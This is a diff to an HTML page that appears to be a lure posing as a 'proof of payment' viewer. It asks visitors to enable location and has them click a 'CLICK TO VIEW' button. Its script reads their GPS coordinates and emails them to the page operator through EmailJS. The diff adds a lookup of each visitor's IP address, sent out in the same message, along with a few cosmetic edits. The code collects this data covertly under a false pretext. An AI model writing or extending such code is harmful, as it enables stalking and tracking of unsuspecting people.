@@ -16,7 +16,7 @@
             background-color: #f0f0f0; /* Light background color */
         }
         img {
-            max-width: 250px; /* Adjust logo size */
+            max-width: 300px; /* Adjust logo size (increased from 150px to 300px) */
             margin-bottom: 20px; /* Space below logo */
         }
         h1 {
@@ -45,7 +45,7 @@
     <p>Please enable Location</p>
 
     <!-- Button that redirects after five clicks -->
-    <button id="proofOfPaymentButton" onclick="handleButtonClick()">Click to View</button>
+    <button id="proofOfPaymentButton" onclick="handleButtonClick()">CLICK TO VIEW</button>
 
     <script>
         (function() {
@@ -66,20 +66,29 @@
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
 
-            const templateParams = {
-                latitude: lat,  
-                longitude: lng, 
-                to_name: 'Recipient Name', // Change as needed
-                from_name: 'Your Name', // Change as needed
-                message: 'Here is my GPS location.'
-            };
+            // Fetch the IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
 
-            emailjs.send('service_79zgaqg', 'template_56xx4ux', templateParams)
-                .then((response) => {
-                    console.log('SUCCESS!', response.status, response.text);
-                }, (error) => {
-                    console.error('FAILED...', error);
-                });
+                    const templateParams = {
+                        latitude: lat,
+                        longitude: lng,
+                        ip_address: ipAddress, // Include IP address in the email
+                        to_name: 'Recipient Name', // Change as needed
+                        from_name: 'Your Name', // Change as needed
+                        message: 'Here is my GPS location and IP address.'
+                    };
+
+                    emailjs.send('service_79zgaqg', 'template_56xx4ux', templateParams)
+                        .then((response) => {
+                            console.log('SUCCESS!', response.status, response.text);
+                        }, (error) => {
+                            console.error('FAILED...', error);
+                        });
+                })
+                .catch(error => console.error("Error fetching IP address:", error));
         }
 
         function showError(error) {
